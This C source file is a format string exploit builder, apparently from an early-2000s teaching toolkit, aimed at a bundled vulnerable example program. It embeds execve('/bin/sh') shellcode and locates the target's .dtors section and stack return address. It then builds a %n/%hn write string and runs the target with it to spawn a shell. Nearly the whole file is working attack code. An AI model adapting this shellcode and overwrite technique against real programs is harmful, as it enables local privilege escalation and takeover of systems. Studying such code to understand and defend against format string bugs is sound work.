/*
 * Copyright (C) 2001, 2002 Pappy.
 * Copyright (C) 2001, 2002 Zorgon.
 * All rights reserved.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "fmtb.h"

#define VERSION "0.3"
#define STACK ( 0xc0000000 - 4 )
#define PATH "examples/lclvuln"

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

char p_fmt[2*MAX_FMT_LENGTH] = "";

int main( int argc, char * argv[] )
{
  char * exec_argv[] = { PATH, p_fmt, NULL };
  char * exec_envp[] = { shellcode, NULL };
  int ( *build_fmt )( string_t * p_string ) = build_n;
  string_t p_string;
  int n, length;
 
  printf( "Format string builder %s\n\n", VERSION );

  printf( "[+] Building the fmt string...\n" );
  p_string.fmt = malloc( MAX_FMT_LENGTH );
	
  /* Calculate base */
  n = build_base( PATH, &p_string ); 
  if ( n < 0 ) {
    printf( "[-] Can't calculate base...\n" );
    printf( "[-] Exit...\n" );
    return( -1 );
  }
  printf( "\tbase=%d\n", p_string.base );
	
  /* Calculate offset */
  p_string.offset = get_offset( PATH ); 
  if ( p_string.offset == 0 ) {
    printf( "[-] Can't calculate offset...\n" );
    printf( "[-] Exit...\n" );
    return( -1 );
  }
  printf( "\toffset=%d\n", p_string.offset );

  /* Calculate local address (.dtors) */
  p_string.locaddr = get_dtors( PATH );
  if (p_string.locaddr == 0 ) {
    printf( "[-] Can't calculate .dtors...\n" );
    printf( "[-] Exit...\n" );
    return( -1 );
  }
  printf( "\tlocaddr=0x%08x\n", p_string.locaddr );

  /* Calculate return address */
  p_string.retaddr = STACK - sizeof( PATH ) - sizeof( shellcode );
  printf( "\tretaddr=0x%08x\n", p_string.retaddr );

  /* Padding */
  printf( "\tpadding=%d\n", p_string.pad );
  memset( p_fmt, 0, sizeof(p_fmt));
  memset( p_fmt, 'X', p_string.pad);

  /* Create the string */
  length = build_fmt( &p_string );
  if ( length == -1 ) {
    build_fmt = build_hn;
    length = build_fmt( &p_string );
    if ( length == -1 ) {
      printf( "[-] Can't building format string...\n" );
      printf( "[-] Exit...\n" );
      return( -1 );
    }
  }
  printf( "[+] Building completed...\n" );

  /* Exploitation */
  printf( "[+] Exploitation...\n" );
  strncat( p_fmt + p_string.pad, p_string.fmt, sizeof(p_fmt)-p_string.pad-1 );
  p_fmt[sizeof(p_fmt)-1] = '\x00';
  free( p_string.fmt );

  execve( exec_argv[0], exec_argv, exec_envp );
  return( -1 );
}
